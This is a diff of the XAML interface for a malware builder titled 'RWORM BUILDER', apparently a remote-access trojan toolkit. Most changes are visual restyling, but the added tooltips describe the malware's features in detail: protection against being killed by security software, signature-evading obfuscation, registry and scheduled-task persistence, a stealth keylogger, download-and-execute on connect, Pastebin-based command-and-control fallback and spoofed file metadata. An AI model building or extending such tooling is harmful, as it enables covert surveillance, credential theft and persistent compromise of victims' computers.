@@ -6,6 +6,9 @@
         Height="620" Width="860"
         MinHeight="540" MinWidth="740"
         WindowStartupLocation="CenterScreen"
+        WindowStyle="None"
+        ResizeMode="CanResizeWithGrip"
+        BorderBrush="#1A1A1A" BorderThickness="1"
         Background="{StaticResource BackgroundSecondaryBrush}"
         Foreground="{StaticResource TextPrimaryBrush}">
 
@@ -15,9 +18,9 @@
         <Style x:Key="TabNavButton" TargetType="RadioButton">
             <Setter Property="Background" Value="Transparent"/>
             <Setter Property="Foreground" Value="{StaticResource TextSecondaryBrush}"/>
-            <Setter Property="FontSize" Value="13"/>
+            <Setter Property="FontSize" Value="12"/>
             <Setter Property="FontWeight" Value="SemiBold"/>
-            <Setter Property="Padding" Value="18,12"/>
+            <Setter Property="Padding" Value="14,10"/>
             <Setter Property="Cursor" Value="Hand"/>
             <Setter Property="Template">
                 <Setter.Value>
@@ -35,7 +38,7 @@
                             <Trigger Property="IsChecked" Value="True">
                                 <Setter Property="Foreground" Value="{StaticResource PrimaryBrush}"/>
                                 <Setter TargetName="TabBorder" Property="BorderBrush" Value="{StaticResource PrimaryBrush}"/>
-                                <Setter TargetName="TabBorder" Property="Background" Value="#1A1D2B"/>
+                                <Setter TargetName="TabBorder" Property="Background" Value="#0F1018"/>
                             </Trigger>
                         </ControlTemplate.Triggers>
                     </ControlTemplate>
@@ -53,7 +56,7 @@
         </Style>
 
         <Style x:Key="LightTextBox" TargetType="TextBox">
-            <Setter Property="Background" Value="#161924"/>
+            <Setter Property="Background" Value="#0A0A0A"/>
             <Setter Property="Foreground" Value="{StaticResource TextPrimaryBrush}"/>
             <Setter Property="CaretBrush" Value="{StaticResource PrimaryBrush}"/>
             <Setter Property="SelectionBrush" Value="{StaticResource PrimaryHoverBrush}"/>
@@ -96,13 +99,15 @@
             <Setter Property="Margin" Value="0,0,0,8"/>
             <Setter Property="Cursor" Value="Hand"/>
         </Style>
+
+        
     </Window.Resources>
 
-    <Grid x:Name="BuilderRoot" RenderTransformOrigin="0.5,0">
+    <Grid x:Name="BuilderRoot" RenderTransformOrigin="0.5,0.5">
         <Grid.RenderTransform>
             <TransformGroup>
-                <ScaleTransform x:Name="LeechScale" ScaleX="1.25" ScaleY="0.25"/>
-                <TranslateTransform x:Name="LeechTranslate" Y="-50"/>
+                <ScaleTransform x:Name="LeechScale" ScaleX="0.05" ScaleY="0.05"/>
+                <TranslateTransform x:Name="LeechTranslate" Y="0"/>
             </TransformGroup>
         </Grid.RenderTransform>
 
@@ -112,23 +117,16 @@
                     <Storyboard>
                         <DoubleAnimation Storyboard.TargetName="LeechScale"
                                          Storyboard.TargetProperty="ScaleY"
-                                         From="0.2" To="1.0" Duration="0:0:0.75">
+                                         From="0.05" To="1.0" Duration="0:0:0.65">
                             <DoubleAnimation.EasingFunction>
                                 <ElasticEase Oscillations="2" Springiness="4" EasingMode="EaseOut"/>
                             </DoubleAnimation.EasingFunction>
                         </DoubleAnimation>
                         <DoubleAnimation Storyboard.TargetName="LeechScale"
                                          Storyboard.TargetProperty="ScaleX"
-                                         From="1.25" To="1.0" Duration="0:0:0.75">
+                                         From="0.05" To="1.0" Duration="0:0:0.65">
                             <DoubleAnimation.EasingFunction>
                                 <ElasticEase Oscillations="2" Springiness="4" EasingMode="EaseOut"/>
-                            </DoubleAnimation.EasingFunction>
-                        </DoubleAnimation>
-                        <DoubleAnimation Storyboard.TargetName="LeechTranslate"
-                                         Storyboard.TargetProperty="Y"
-                                         From="-50" To="0" Duration="0:0:0.65">
-                            <DoubleAnimation.EasingFunction>
-                                <BackEase Amplitude="0.8" EasingMode="EaseOut"/>
                             </DoubleAnimation.EasingFunction>
                         </DoubleAnimation>
                         <DoubleAnimation Storyboard.TargetName="BuilderRoot"
@@ -140,18 +138,18 @@
         </Grid.Triggers>
 
         <Grid.RowDefinitions>
-            <RowDefinition Height="54"/>
+            <RowDefinition Height="42"/>
             <RowDefinition Height="*"/>
-            <RowDefinition Height="50"/>
+            <RowDefinition Height="46"/>
         </Grid.RowDefinitions>
 
-        <Border Grid.Row="0" Background="{StaticResource BackgroundMainBrush}" BorderBrush="{StaticResource BorderBrush}" BorderThickness="0,0,0,1">
-            <Grid Margin="18,0">
+        <Border Grid.Row="0" Background="#000000" BorderBrush="{StaticResource BorderBrush}" BorderThickness="0,0,0,1" MouseDown="TitleBar_MouseDown">
+            <Grid Margin="12,0,8,0">
                 <StackPanel Orientation="Horizontal" HorizontalAlignment="Left" VerticalAlignment="Center">
-                    <StackPanel Orientation="Horizontal" Margin="0,0,24,0" VerticalAlignment="Center">
-                        <Image Source="pack://application:,,,/Resources/Assets/builder.png" Width="20" Height="20" Margin="0,0,8,0" VerticalAlignment="Center"/>
-                        <TextBlock Text="RWORM BUILDER" FontSize="14" FontWeight="Bold" Foreground="{StaticResource TextPrimaryBrush}" VerticalAlignment="Center"/>
-                    </StackPanel>
+                    <Border Background="#0C0C0C" BorderBrush="#1F1F1F" BorderThickness="1" CornerRadius="6" Width="26" Height="26" Margin="0,0,10,0" VerticalAlignment="Center">
+                        <Image Source="pack://application:,,,/Resources/Assets/builder.png" Width="16" Height="16" VerticalAlignment="Center" HorizontalAlignment="Center"/>
+                    </Border>
+                    <TextBlock Text="RWORM BUILDER" FontSize="12" FontWeight="Bold" Foreground="{StaticResource TextPrimaryBrush}" VerticalAlignment="Center" Margin="0,0,18,0"/>
 
                     <RadioButton x:Name="TabSurveillance" Style="{StaticResource TabNavButton}" Content="SURVEILLANCE"
                                  GroupName="BuilderTabs" IsChecked="True" Click="Tab_Click" Tag="0"/>
@@ -161,6 +159,12 @@
                                  GroupName="BuilderTabs" Click="Tab_Click" Tag="2"/>
                     <RadioButton x:Name="TabBuild" Style="{StaticResource TabNavButton}" Content="BUILD"
                                  GroupName="BuilderTabs" Click="Tab_Click" Tag="3"/>
+                </StackPanel>
+
+                <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
+                    <Button Style="{StaticResource TitleBtnStyle}" Content="—" Click="MinimizeBtn_Click"/>
+                    <Button Style="{StaticResource TitleBtnStyle}" Content="🗖" Click="MaximizeBtn_Click"/>
+                    <Button Style="{StaticResource TitleCloseBtnStyle}" Content="✕" Click="CloseBtn_Click"/>
                 </StackPanel>
             </Grid>
         </Border>
@@ -181,14 +185,43 @@
                         <Border Style="{StaticResource LightCard}">
                             <StackPanel>
                                 <TextBlock Text="Defense &amp; Alerts" FontSize="14" FontWeight="SemiBold" Foreground="{StaticResource PrimaryBrush}" Margin="0,0,0,12"/>
-                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Anti-Kill (Embedded explorer.exe supervisor &amp; anti-termination)"
-                                          IsChecked="{Binding BuildAntiKill}"/>
-                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Obfuscator (AsyncRAT dnlib identifier, class &amp; symbol renaming)"
-                                          IsChecked="{Binding BuildObfuscator}"/>
-                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Anti-Sandbox / Anti-VM (Maintenance / Disabled)"
-                                          IsChecked="False" IsEnabled="False" Opacity="0.6"/>
-                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Discord Webhook Alert (Notify on client connection)"
-                                          IsChecked="{Binding BuildDiscordAlert}" Margin="0,6,0,6"/>
+                                
+                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Anti-Kill Protection"
+                                          IsChecked="{Binding BuildAntiKill}">
+                                    <CheckBox.ToolTip>
+                                        <ToolTip Background="#0A0A0A" BorderBrush="#252525" BorderThickness="1" Padding="12">
+                                            <StackPanel MaxWidth="320">
+                                                <TextBlock Text="Anti-Kill Protection Engine" FontWeight="Bold" Foreground="#5865F2" FontSize="12"/>
+                                                <TextBlock Text="Runs embedded explorer.exe supervisor to prevent task kill and process termination by Task Manager, Process Hacker, and security software." Foreground="#CCCCCC" FontSize="11" Margin="0,4,0,0" TextWrapping="Wrap"/>
+                                            </StackPanel>
+                                        </ToolTip>
+                                    </CheckBox.ToolTip>
+                                </CheckBox>
+
+                                <CheckBox Style="{StaticResource LightCheckBox}" Content="AsyncRAT Obfuscator"
+                                          IsChecked="{Binding BuildObfuscator}">
+                                    <CheckBox.ToolTip>
+                                        <ToolTip Background="#0A0A0A" BorderBrush="#252525" BorderThickness="1" Padding="12">
+                                            <StackPanel MaxWidth="320">
+                                                <TextBlock Text="dnlib Renaming Obfuscator" FontWeight="Bold" Foreground="#5865F2" FontSize="12"/>
+                                                <TextBlock Text="Renames classes, methods, parameters, and fields with randomized Unicode characters, effectively evading static signatures." Foreground="#CCCCCC" FontSize="11" Margin="0,4,0,0" TextWrapping="Wrap"/>
+                                            </StackPanel>
+                                        </ToolTip>
+                                    </CheckBox.ToolTip>
+                                </CheckBox>
+
+                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Discord Webhook Alert"
+                                          IsChecked="{Binding BuildDiscordAlert}" Margin="0,6,0,6">
+                                    <CheckBox.ToolTip>
+                                        <ToolTip Background="#0A0A0A" BorderBrush="#252525" BorderThickness="1" Padding="12">
+                                            <StackPanel MaxWidth="320">
+                                                <TextBlock Text="Discord Connection Webhook" FontWeight="Bold" Foreground="#5865F2" FontSize="12"/>
+                                                <TextBlock Text="Transmits notification alerts to your Discord channel whenever a client device comes online." Foreground="#CCCCCC" FontSize="11" Margin="0,4,0,0" TextWrapping="Wrap"/>
+                                            </StackPanel>
+                                        </ToolTip>
+                                    </CheckBox.ToolTip>
+                                </CheckBox>
+
                                 <Grid Margin="24,0,0,4" IsEnabled="{Binding BuildDiscordAlert}">
                                     <Grid.ColumnDefinitions>
                                         <ColumnDefinition Width="Auto"/>
@@ -204,10 +237,31 @@
                         <Border Style="{StaticResource LightCard}">
                             <StackPanel>
                                 <TextBlock Text="Persistence Settings" FontSize="14" FontWeight="SemiBold" Foreground="{StaticResource PrimaryBrush}" Margin="0,0,0,12"/>
-                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Startup Registry (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)"
-                                          IsChecked="{Binding BuildStartupRegistry}"/>
-                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Scheduled Tasks (SCH TASKS — Auto-restart on user logon)"
-                                          IsChecked="{Binding BuildSchTasks}"/>
+                                
+                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Startup Registry Run Key"
+                                          IsChecked="{Binding BuildStartupRegistry}">
+                                    <CheckBox.ToolTip>
+                                        <ToolTip Background="#0A0A0A" BorderBrush="#252525" BorderThickness="1" Padding="12">
+                                            <StackPanel MaxWidth="320">
+                                                <TextBlock Text="HKCU Run Key Persistence" FontWeight="Bold" Foreground="#5865F2" FontSize="12"/>
+                                                <TextBlock Text="Adds persistent startup autorun key under HKCU\Software\Microsoft\Windows\CurrentVersion\Run." Foreground="#CCCCCC" FontSize="11" Margin="0,4,0,0" TextWrapping="Wrap"/>
+                                            </StackPanel>
+                                        </ToolTip>
+                                    </CheckBox.ToolTip>
+                                </CheckBox>
+
+                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Scheduled Tasks (SCHTASKS)"
+                                          IsChecked="{Binding BuildSchTasks}">
+                                    <CheckBox.ToolTip>
+                                        <ToolTip Background="#0A0A0A" BorderBrush="#252525" BorderThickness="1" Padding="12">
+                                            <StackPanel MaxWidth="320">
+                                                <TextBlock Text="Windows Task Scheduler Persistence" FontWeight="Bold" Foreground="#5865F2" FontSize="12"/>
+                                                <TextBlock Text="Registers a persistent Windows scheduled task that restarts the process on logon and user activity." Foreground="#CCCCCC" FontSize="11" Margin="0,4,0,0" TextWrapping="Wrap"/>
+                                            </StackPanel>
+                                        </ToolTip>
+                                    </CheckBox.ToolTip>
+                                </CheckBox>
+
                                 <StackPanel Orientation="Horizontal" Margin="0,6,0,0">
                                     <TextBlock Text="Installation / Startup Path:" FontSize="12" Foreground="{StaticResource TextSecondaryBrush}" VerticalAlignment="Center" Margin="0,0,12,0"/>
                                     <TextBox Style="{StaticResource LightTextBox}" Width="320" Height="34"
@@ -219,19 +273,39 @@
                         <Border Style="{StaticResource LightCard}">
                             <StackPanel>
                                 <TextBlock Text="Monitoring &amp; Tasks" FontSize="14" FontWeight="SemiBold" Foreground="{StaticResource PrimaryBrush}" Margin="0,0,0,12"/>
-                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Enable Keylogger"
-                                          IsChecked="{Binding BuildKeyloggerEnabled}"/>
+                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Enable Keylogger Engine"
+                                          IsChecked="{Binding BuildKeyloggerEnabled}">
+                                    <CheckBox.ToolTip>
+                                        <ToolTip Background="#0A0A0A" BorderBrush="#252525" BorderThickness="1" Padding="12">
+                                            <StackPanel MaxWidth="320">
+                                                <TextBlock Text="Stealth Keylogger Subsystem" FontWeight="Bold" Foreground="#5865F2" FontSize="12"/>
+                                                <TextBlock Text="Records keystrokes, active window titles, and input timestamps with zero CPU lag." Foreground="#CCCCCC" FontSize="11" Margin="0,4,0,0" TextWrapping="Wrap"/>
+                                            </StackPanel>
+                                        </ToolTip>
+                                    </CheckBox.ToolTip>
+                                </CheckBox>
+
                                 <StackPanel Orientation="Horizontal" Margin="24,0,0,12" IsEnabled="{Binding BuildKeyloggerEnabled}">
-                                    <RadioButton Content="Offline (log to file until retrieved)"
+                                    <RadioButton Content="Offline (buffer local)"
                                                  IsChecked="{Binding BuildKeyloggerOnline, Converter={StaticResource InverseBoolConverter}, Mode=TwoWay}"
                                                  Foreground="{StaticResource TextSecondaryBrush}" Margin="0,0,16,0"/>
-                                    <RadioButton Content="Online (stream live)"
+                                    <RadioButton Content="Online (live stream)"
                                                  IsChecked="{Binding BuildKeyloggerOnline}"
                                                  Foreground="{StaticResource TextSecondaryBrush}"/>
                                 </StackPanel>
 
-                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Enable Loader Task on Connect"
-                                          IsChecked="{Binding BuildTaskEnabled}" Margin="0,6,0,6"/>
+                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Download &amp; Execute Task on Connect"
+                                          IsChecked="{Binding BuildTaskEnabled}" Margin="0,6,0,6">
+                                    <CheckBox.ToolTip>
+                                        <ToolTip Background="#0A0A0A" BorderBrush="#252525" BorderThickness="1" Padding="12">
+                                            <StackPanel MaxWidth="320">
+                                                <TextBlock Text="Payload Task Engine" FontWeight="Bold" Foreground="#5865F2" FontSize="12"/>
+                                                <TextBlock Text="Fetches and executes an auxiliary executable or script immediately upon connection." Foreground="#CCCCCC" FontSize="11" Margin="0,4,0,0" TextWrapping="Wrap"/>
+                                            </StackPanel>
+                                        </ToolTip>
+                                    </CheckBox.ToolTip>
+                                </CheckBox>
+
                                 <Grid Margin="24,0,0,0" IsEnabled="{Binding BuildTaskEnabled}">
                                     <Grid.ColumnDefinitions>
                                         <ColumnDefinition Width="Auto"/>
@@ -308,8 +382,16 @@
                         <Border Style="{StaticResource LightCard}">
                             <StackPanel>
                                 <CheckBox Style="{StaticResource LightCheckBox}" Content="Dynamic Resolution (Pastebin Raw)"
-                                          IsChecked="{Binding BuildPastebinEnabled}" FontWeight="SemiBold" Foreground="{StaticResource PrimaryBrush}" Margin="0,0,0,8"/>
-                                <TextBlock Text="Get IP / Port from Pastebin raw URL (Dynamic C2 fallback):" FontSize="12" Foreground="{StaticResource TextSecondaryBrush}" Margin="0,0,0,8"/>
+                                          IsChecked="{Binding BuildPastebinEnabled}" FontWeight="SemiBold" Foreground="{StaticResource PrimaryBrush}" Margin="0,0,0,8">
+                                    <CheckBox.ToolTip>
+                                        <ToolTip Background="#0A0A0A" BorderBrush="#252525" BorderThickness="1" Padding="12">
+                                            <StackPanel MaxWidth="320">
+                                                <TextBlock Text="Dynamic Pastebin C2 Fallback" FontWeight="Bold" Foreground="#5865F2" FontSize="12"/>
+                                                <TextBlock Text="Allows fetching the real-time C2 address and port dynamically from a Pastebin raw link." Foreground="#CCCCCC" FontSize="11" Margin="0,4,0,0" TextWrapping="Wrap"/>
+                                            </StackPanel>
+                                        </ToolTip>
+                                    </CheckBox.ToolTip>
+                                </CheckBox>
                                 <Grid IsEnabled="{Binding BuildPastebinEnabled}">
                                     <Grid.ColumnDefinitions>
                                         <ColumnDefinition Width="*"/>
@@ -345,8 +427,17 @@
 
                         <Border Style="{StaticResource LightCard}">
                             <StackPanel>
-                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Custom Client Icon (.ico)"
-                                          IsChecked="{Binding BuildIconEnabled}" FontWeight="SemiBold" Foreground="{StaticResource PrimaryBrush}" Margin="0,0,10,10"/>
+                                <CheckBox Style="{StaticResource LightCheckBox}" Content="Custom Application Icon (.ico)"
+                                          IsChecked="{Binding BuildIconEnabled}" FontWeight="SemiBold" Foreground="{StaticResource PrimaryBrush}" Margin="0,0,10,10">
+                                    <CheckBox.ToolTip>
+                                        <ToolTip Background="#0A0A0A" BorderBrush="#252525" BorderThickness="1" Padding="12">
+                                            <StackPanel MaxWidth="320">
+                                                <TextBlock Text="PE Application Icon" FontWeight="Bold" Foreground="#5865F2" FontSize="12"/>
+                                                <TextBlock Text="Embeds a custom icon resource into the final compiled client binary." Foreground="#CCCCCC" FontSize="11" Margin="0,4,0,0" TextWrapping="Wrap"/>
+                                            </StackPanel>
+                                        </ToolTip>
+                                    </CheckBox.ToolTip>
+                                </CheckBox>
                                 <Grid IsEnabled="{Binding BuildIconEnabled}">
                                     <Grid.ColumnDefinitions>
                                         <ColumnDefinition Width="*"/>
@@ -359,16 +450,23 @@
                                             Style="{StaticResource PrimaryButton}"
                                             Padding="14,0" Height="36" Margin="10,0,0,0" FontWeight="SemiBold" Cursor="Hand"/>
                                 </Grid>
-                                <TextBlock Text="Leave unchecked or unselected to compile without custom application icon."
-                                           FontSize="11" Foreground="{StaticResource TextMutedBrush}" Margin="0,6,0,0"/>
                             </StackPanel>
                         </Border>
 
                         <Border Style="{StaticResource LightCard}">
                             <StackPanel>
                                 <DockPanel Margin="0,0,0,12">
-                                    <CheckBox Style="{StaticResource LightCheckBox}" Content="Enable Custom Assembly Spoofing"
-                                              IsChecked="{Binding BuildAssemblyEnabled}" FontWeight="SemiBold" Foreground="{StaticResource PrimaryBrush}" VerticalAlignment="Center"/>
+                                    <CheckBox Style="{StaticResource LightCheckBox}" Content="Custom Assembly Spoofing"
+                                              IsChecked="{Binding BuildAssemblyEnabled}" FontWeight="SemiBold" Foreground="{StaticResource PrimaryBrush}" VerticalAlignment="Center">
+                                        <CheckBox.ToolTip>
+                                            <ToolTip Background="#0A0A0A" BorderBrush="#252525" BorderThickness="1" Padding="12">
+                                                <StackPanel MaxWidth="320">
+                                                    <TextBlock Text="Authenticode Metadata Cloning" FontWeight="Bold" Foreground="#5865F2" FontSize="12"/>
+                                                    <TextBlock Text="Spoofs Company, Copyright, Product, Description, and File Version headers to mimic legitimate Windows software." Foreground="#CCCCCC" FontSize="11" Margin="0,4,0,0" TextWrapping="Wrap"/>
+                                                </StackPanel>
+                                            </ToolTip>
+                                        </CheckBox.ToolTip>
+                                    </CheckBox>
                                     <Button DockPanel.Dock="Right" Content="Clone Assembly from File" Command="{Binding CloneAssemblyCommand}"
                                             Background="{StaticResource SuccessBrush}" Foreground="White" BorderThickness="0"
                                             Padding="14,0" Height="32" FontWeight="SemiBold" Cursor="Hand">
@@ -489,7 +587,7 @@
                             </StackPanel>
                         </Border>
 
-                        <Border Style="{StaticResource LightCard}" Background="#101824" BorderBrush="#1F2A3E">
+                        <Border Style="{StaticResource LightCard}" Background="#080808" BorderBrush="#1C1C1C">
                             <Grid>
                                 <Grid.ColumnDefinitions>
                                     <ColumnDefinition Width="*"/>
@@ -530,7 +628,7 @@
             </TabItem>
         </TabControl>
 
-        <Border Grid.Row="2" Background="{StaticResource BackgroundMainBrush}" BorderBrush="{StaticResource BorderBrush}" BorderThickness="0,1,0,0">
+        <Border Grid.Row="2" Background="#000000" BorderBrush="{StaticResource BorderBrush}" BorderThickness="0,1,0,0">
             <Grid Margin="18,0">
                 <StackPanel Orientation="Horizontal" HorizontalAlignment="Right" VerticalAlignment="Center">
                     <TextBlock Text="Payload: Windows x64 (~11 MB)" FontSize="12" Foreground="{StaticResource TextMutedBrush}"/>
